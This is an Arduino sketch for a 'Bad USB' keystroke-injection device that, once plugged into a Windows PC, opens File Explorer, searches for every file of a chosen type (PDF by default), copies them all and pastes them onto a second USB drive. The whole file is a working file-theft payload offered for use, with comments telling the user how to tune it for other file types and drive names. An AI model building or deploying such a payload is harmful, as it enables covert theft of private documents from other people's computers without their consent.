// You can set yourself the delay you want by testing, the delay here is always the same.
// PLEASE plug in second USB in before Bad USB.

#include <KeyboardAzertyFr.h>

// Init function
void setup()
{
  // Begining the stream
  KeyboardAzertyFr.begin();
  
  // Waiting 500ms for init
  delay(500);

  // Press Windows + r
  KeyboardAzertyFr.press(KEY_LEFT_GUI);
  KeyboardAzertyFr.press('e');
  KeyboardAzertyFr.releaseAll();

  delay(300);

  // Press Ctrl + f
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press('f');
  KeyboardAzertyFr.releaseAll();

  delay(300);

  // Print (replace pdf with whatever file type you want to grab)
  KeyboardAzertyFr.print("ext:pdf");
  
  delay(300);

  // Press return
  KeyboardAzertyFr.press(KEY_RETURN);
  KeyboardAzertyFr.releaseAll();

  
  // Delay here can depend of the quantity of files stored on the PC
  delay(20000); 

  typeKey(KEY_TAB);

  delay(200);

  // Press escape (stop the research)
  typeKey(KEY_ESC);

  delay(200);

  // Press Ctrl + a (select all files)
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press('a');
  KeyboardAzertyFr.releaseAll();

  delay(400);
  
  // Press Ctrl + c (copy all files)
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press('c');
  KeyboardAzertyFr.releaseAll();

  delay(500);

  // Press Ctrl + l (change the path)
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press('l');
  KeyboardAzertyFr.releaseAll();

  delay(200);

  // Replace USB DATA with the name of the second usb you are using
  KeyboardAzertyFr.print("USB DATA");

  delay(100);

  // Press down arrow (select the second usb key)
  typeKey(KEY_DOWN_ARROW);

  delay(200);

  // Press return
  typeKey(KEY_RETURN);

  delay(300);

  // Press Ctrl + v (paste the files to the second usb key)
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press('v');
  KeyboardAzertyFr.releaseAll();

  // Delay here can depend of the quantity of files paste on the second usb key
  delay(10000);

  // Press Alt + F4 (close tab of second usb key)
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.press(KEY_F4);
  KeyboardAzertyFr.releaseAll();

}

void typeKey(int key)
{
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}

// Nothing here   
void loop() {}
